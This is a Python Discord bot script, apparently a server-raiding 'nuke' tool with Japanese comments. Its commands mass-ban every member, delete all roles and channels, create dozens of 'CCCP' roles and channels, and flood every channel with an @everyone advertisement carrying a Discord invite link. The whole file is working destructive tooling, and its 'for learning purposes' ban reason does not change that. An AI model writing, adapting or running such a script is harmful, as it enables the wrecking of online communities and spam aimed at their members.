import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv
import random

load_dotenv()

TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

ADVERTISEMENT = (
    "@everyone @here\n"
    "**CCCP ON TOP**\n"
    "[今すぐ参加](https://discord.gg/ncUCZfJXRs)\n"
    "![GIF1](https://imgur.com/NbBGFcf.gif)\n"
    "![GIF2](https://imgur.com/pY7EpwN.gif)"
)

@bot.event
async def on_ready():
    print(f"✅ Bot起動完了: {bot.user}")

async def safe_action(coro):
    try:
        await coro
    except Exception as e:
        # ログ出力（必要に応じてファイル等に変更可能）
        print(f"⚠️ エラー: {e}")

@bot.command()
async def ban(ctx):
    members = [m for m in ctx.guild.members if m != ctx.author and m != bot.user]
    await asyncio.gather(*[safe_action(m.ban(reason="学習目的BAN")) for m in members])
    await ctx.send(f"✅ {len(members)}人をBANしました。")

@bot.command()
async def roles(ctx):
    guild = ctx.guild

    roles_to_delete = [r for r in guild.roles if r.name != "@everyone" and r < guild.me.top_role]
    await asyncio.gather(*[safe_action(r.delete()) for r in roles_to_delete])

    async def create_role(i):
        color = discord.Color.from_rgb(
            random.randint(0,255),
            random.randint(0,255),
            random.randint(0,255)
        )
        await safe_action(guild.create_role(name=f"CCCP-{i+1}", color=color))

    await asyncio.gather(*[create_role(i) for i in range(50)])
    await ctx.send("✅ ロールを削除し、新規50個を作成しました。")

@bot.command()
async def cccp(ctx):
    guild = ctx.guild

    # チャンネル削除
    await asyncio.gather(*[safe_action(ch.delete()) for ch in guild.channels])

    # チャンネル60個作成
    created_channels = await asyncio.gather(*[
        safe_action(guild.create_text_channel(f"cccp-{i}")) for i in range(60)
    ])

    # created_channelsに None（失敗）が混ざるのでフィルター
    created_channels = [ch for ch in created_channels if ch is not None]

    # 最初のチャンネルに60回メッセージ送信
    target_channel = created_channels[0] if created_channels else None
    if target_channel:
        await asyncio.gather(*[safe_action(target_channel.send(ADVERTISEMENT)) for _ in range(60)])

    # 全チャンネルに1回メッセージ送信
    text_channels = [ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
    await asyncio.gather(*[safe_action(ch.send(ADVERTISEMENT)) for ch in text_channels])

    await ctx.send(f"✅ CCCP実行完了！チャンネル作成数: {len(created_channels)}")

@bot.command()
async def broadcast(ctx):
    text_channels = [ch for ch in ctx.guild.text_channels if ch.permissions_for(ctx.guild.me).send_messages]
    await asyncio.gather(*[safe_action(ch.send(ADVERTISEMENT)) for ch in text_channels])
    await ctx.send(f"✅ 宣伝メッセージを{len(text_channels)}チャンネルに送信しました。")

bot.run(TOKEN)
